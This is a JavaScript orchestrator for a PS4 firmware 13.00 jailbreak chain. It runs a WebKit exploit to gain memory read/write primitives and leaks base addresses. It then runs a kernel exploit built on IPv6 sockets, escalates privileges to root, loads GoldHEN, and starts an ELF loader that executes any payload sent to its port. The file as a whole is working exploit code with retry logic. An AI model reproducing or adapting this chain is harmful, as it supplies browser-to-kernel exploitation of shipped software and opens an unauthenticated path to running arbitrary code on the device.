// main.js - Main exploit orchestrator for PS4 FW 13.00
// Full exploit chain: WebKit → Kernel R/W → Privilege Escalation → GoldHEN → ELF Loader
// Enhanced with better error recovery and retry logic

import { establishPrimitive, fakeCellReleased } from './webkit/core.js';
import { installWindowP, leakval, read4, read8, write4, write8, toI64 } from './webkit/mem.js';
import { rop } from './webkit/rop.js';
import { KernelExploit } from './kernel/kernel.js';
import { initELFLoader, acceptConnection, receivePayload, executePayload, cleanup as cleanupELF, PAYLOAD_PORT, loadGoldHEN, getGoldHENInfo } from './payloads/loader.js';
import { loadOffsets, isFW1300, hasUsableOffsets } from './webkit/offsets_loader.js';
import { GOLDHEN_CONFIG } from './payloads/goldhen.js';
import { validateAddress, validateSize, validateString } from './utils/validation.js';
import { CONFIG, getExploitConfig, getKernelConfig, getPayloadConfig } from './utils/config.js';
import { getBridge, initBridgeWithPrimitives } from './webkit/syscall_bridge.js';
import { OFFSETS } from './webkit/offsets.js';

const exploitConfig = getExploitConfig();
const payloadConfig = getPayloadConfig();

// Max retries per stage
const MAX_STAGE_RETRIES = 3;
const STAGE_RETRY_DELAY = 200;

let exploitState = {
    running: false, complete: false, error: null,
    carrier: null, primitives: null,
    webKitBase: 0, libkernelBase: 0, kernelBase: 0,
    kernelExploit: null,
    elfLoaderRunning: false,
    offsets: null, firmware: null, timestamp: null,
    goldhenLoaded: false, goldhenInfo: null,
    bridgeInitialized: false, escalated: false,
    stageTimings: {},
    retryCount: 0
};

function log(tag, detail = '') {
    const ts = new Date().toISOString().slice(11, 23);
    const msg = `[${ts}] ${tag}: ${detail}`;
    console.log(msg);
    const el = document.getElementById('logOutput');
    if (el) { el.textContent += msg + '\n'; el.scrollTop = el.scrollHeight; }
    updateStatus(tag, detail);
}

function updateStatus(tag, detail) {
    const st = document.getElementById('statusText');
    const pf = document.getElementById('progressFill');
    if (st) {
        if (tag.includes('ERROR') || tag.includes('FAIL')) {
            st.textContent = `خطأ: ${detail}`;
            st.style.color = '#ff6b6b';
        } else if (tag.includes('COMPLETE') || tag.includes('SUCCESS')) {
            st.textContent = 'اكتمل بنجاح!';
            st.style.color = '#51cf66';
        } else {
            st.textContent = `${tag}: ${detail}`;
        }
    }
    if (pf) {
        if (tag.includes('WebKit') || tag.includes('PRIMITIVE')) pf.style.width = '20%';
        else if (tag.includes('KERNEL')) pf.style.width = '45%';
        else if (tag.includes('ESCALAT')) pf.style.width = '60%';
        else if (tag.includes('GOLDHEN')) pf.style.width = '80%';
        else if (tag.includes('ELF') || tag.includes('PAYLOAD')) pf.style.width = '90%';
        else if (tag.includes('COMPLETE')) pf.style.width = '100%';
    }
}

window.clearLog = function() { const el = document.getElementById('logOutput'); if (el) el.textContent = ''; };

// Helper: retry a stage function
async function withRetry(stageName, stageFn, maxRetries = MAX_STAGE_RETRIES) {
    let lastError = null;
    for (let attempt = 0; attempt <= maxRetries; attempt++) {
        try {
            if (attempt > 0) {
                log(stageName, `Retry ${attempt}/${maxRetries}...`);
                await new Promise(r => setTimeout(r, STAGE_RETRY_DELAY * attempt));
            }
            const result = await stageFn();
            if (result) return result;
            lastError = new Error(`${stageName} returned false`);
        } catch (error) {
            lastError = error;
            log(`${stageName}-WARN`, `Attempt ${attempt + 1} failed: ${error.message.slice(0, 80)}`);
        }
    }
    throw lastError;
}

async function stage1_webkitExploit() {
    log('STAGE1', 'Starting WebKit exploit...');
    const startTime = Date.now();

    await withRetry('STAGE1', async () => {
        exploitState.carrier = await establishPrimitive({
            onEvent: (tag, detail, attempt) => log(`WK-${tag}`, `attempt=${attempt} ${detail}`),
            maxAttempts: exploitConfig.maxAttempts
        });
        if (!exploitState.carrier) throw new Error('Failed to establish carrier');
        log('STAGE1', `WebKit exploit OK - host=0x${exploitState.carrier.hostAddress.toString(16)}`);
        return true;
    });

    exploitState.stageTimings.stage1 = Date.now() - startTime;
    return true;
}

async function stage2_installPrimitives() {
    log('STAGE2', 'Installing memory primitives...');
    const startTime = Date.now();

    await withRetry('STAGE2', async () => {
        exploitState.primitives = installWindowP(exploitState.carrier);
        if (!exploitState.primitives) throw new Error('Failed to install primitives');
        log('STAGE2', 'Memory primitives installed (read/write/leakval/addrof/fakeobj)');
        return true;
    });

    exploitState.stageTimings.stage2 = Date.now() - startTime;
    return true;
}

async function stage3_leakAddresses() {
    log('STAGE3', 'Leaking base addresses...');
    const startTime = Date.now();

    await withRetry('STAGE3', async () => {
        const offsets = await loadOffsets('13.00');
        exploitState.offsets = offsets;
        exploitState.webKitBase = offsets.webkit.vtable;
        exploitState.libkernelBase = offsets.libkernel.sceKernelGetCurrentCpu;
        log('STAGE3', `WebKit=0x${exploitState.webKitBase.toString(16)} libkernel=0x${exploitState.libkernelBase.toString(16)}`);
        return true;
    });

    exploitState.stageTimings.stage3 = Date.now() - startTime;
    return true;
}

async function stage4_kernelExploit() {
    log('STAGE4', 'Starting kernel exploit (Poopsploit)...');
    const startTime = Date.now();

    await withRetry('STAGE4', async () => {
        const rp = exploitState.primitives;
        exploitState.kernelExploit = new KernelExploit(rp, rp);

        log('STAGE4', 'Creating IPv6 sockets...');
        const result = await exploitState.kernelExploit.run();
        if (!result) throw new Error('Kernel exploit failed to find twin');

        exploitState.kernelBase = exploitState.kernelExploit.kernelBase;
        log('STAGE4', `Twins found! kernelBase=0x${exploitState.kernelBase.toString(16)}`);

        try {
            const bridge = getBridge();
            bridge.initWithPrimitives(rp, rp, exploitState.kernelBase);
            exploitState.bridgeInitialized = true;
            log('STAGE4', 'Syscall bridge initialized with kernel R/W');
        } catch (e) {
            log('STAGE4-WARN', `Bridge init warning: ${e.message}`);
        }

        await exploitState.kernelExploit.cleanup();
        log('STAGE4', 'Kernel exploit completed');
        return true;
    });

    exploitState.stageTimings.stage4 = Date.now() - startTime;
    return true;
}

async function stage5_escalation() {
    log('STAGE5', 'Escalating privileges...');
    const startTime = Date.now();

    await withRetry('STAGE5', async () => {
        if (!exploitState.kernelExploit) throw new Error('Kernel exploit not initialized');
        await exploitState.kernelExploit.escalatePrivileges();
        exploitState.escalated = true;
        log('STAGE5', 'Privilege escalation successful (uid=0, gid=0)');
        return true;
    });

    exploitState.stageTimings.stage5 = Date.now() - startTime;
    return true;
}

async function stage6_goldhen() {
    log('STAGE6', `Loading GoldHEN ${CONFIG.goldhenVersion}...`);
    const startTime = Date.now();

    await withRetry('STAGE6', async () => {
        const goldhenData = await loadGoldHEN();
        if (!goldhenData) throw new Error('Failed to load GoldHEN payload');
        exploitState.goldhenLoaded = true;
        exploitState.goldhenInfo = getGoldHENInfo();
        log('STAGE6', `GoldHEN loaded: ${goldhenData.length} bytes`);
        return true;
    });

    exploitState.stageTimings.stage6 = Date.now() - startTime;
    return true;
}

async function stage7_elfLoader() {
    log('STAGE7', 'Starting ELF loader...');
    const startTime = Date.now();

    await withRetry('STAGE7', async () => {
        const ok = await initELFLoader();
        if (!ok) throw new Error('Failed to initialize ELF loader');
        exploitState.elfLoaderRunning = true;
        log('STAGE7', `ELF loader listening on port ${PAYLOAD_PORT}`);

        acceptConnection().then(async (fd) => {
            log('STAGE7', `Client connected`);
            try {
                const payload = await receivePayload();
                log('STAGE7', `Payload received: ${payload.length} bytes`);
                await executePayload(payload);
                log('STAGE7', 'Payload executed');
            } catch (e) { log('STAGE7-ERROR', e.message); }
        }).catch(e => log('STAGE7-ERROR', e.message));

        return true;
    });

    exploitState.stageTimings.stage7 = Date.now() - startTime;
    return true;
}

async function runExploit() {
    if (exploitState.running) { log('ERROR', 'Exploit already running'); return; }
    exploitState.running = true;
    exploitState.complete = false;
    exploitState.error = null;
    exploitState.timestamp = new Date().toISOString();
    exploitState.stageTimings = {};
    exploitState.retryCount = 0;

    const totalTimeStart = Date.now();

    log('BOOT', 'Starting PS4 FW 13.00 exploit...');
    log('BOOT', `Firmware: ${isFW1300() ? 'FW 13.00 detected' : 'Unknown'}`);
    log('BOOT', `GoldHEN: ${CONFIG.goldhenVersion}`);

    try {
        await stage1_webkitExploit();
        await stage2_installPrimitives();
        await stage3_leakAddresses();
        await stage4_kernelExploit();
        await stage5_escalation();
        await stage6_goldhen();
        await stage7_elfLoader();

        const totalTime = Date.now() - totalTimeStart;
        exploitState.complete = true;
        exploitState.stageTimings.total = totalTime;

        log('COMPLETE', 'Exploit completed successfully!');
        log('COMPLETE', `GoldHEN ${CONFIG.goldhenVersion} is running`);
        log('COMPLETE', `ELF loader on port ${PAYLOAD_PORT}`);
        log('COMPLETE', `Total time: ${totalTime}ms`);
        log('COMPLETE', `Stage timings: S1=${exploitState.stageTimings.stage1||0}ms S2=${exploitState.stageTimings.stage2||0}ms S3=${exploitState.stageTimings.stage3||0}ms S4=${exploitState.stageTimings.stage4||0}ms S5=${exploitState.stageTimings.stage5||0}ms S6=${exploitState.stageTimings.stage6||0}ms S7=${exploitState.stageTimings.stage7||0}ms`);
    } catch (error) {
        exploitState.error = error;
        log('ERROR', `Exploit failed: ${error.message}`);
    } finally {
        exploitState.running = false;
    }
}

async function cleanup() {
    log('CLEANUP', 'Cleaning up...');
    try {
        if (exploitState.kernelExploit) {
            await exploitState.kernelExploit.cleanup();
            exploitState.kernelExploit.dispose();
        }
        if (exploitState.carrier && typeof fakeCellReleased === 'function') fakeCellReleased();
        if (exploitState.elfLoaderRunning) { await cleanupELF(); exploitState.elfLoaderRunning = false; }
        exploitState.bridgeInitialized = false;
        exploitState.escalated = false;
        log('CLEANUP', 'Done');
    } catch (error) { log('CLEANUP-ERROR', error.message); }
}

window.startExploit = runExploit;
window.cleanupExploit = cleanup;

try {
    const ua = navigator.userAgent;
    const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
    if (fwMatch) {
        exploitState.firmware = fwMatch[1];
        log('DETECT', `Firmware: ${fwMatch[1]}`);
        const fwEl = document.getElementById('fwVersion');
        if (fwEl) fwEl.textContent = fwMatch[1];
        if (!isFW1300()) log('DETECT', 'Warning: This exploit is designed for FW 13.00');
    }
} catch (e) {}

export { runExploit, cleanup, exploitState };
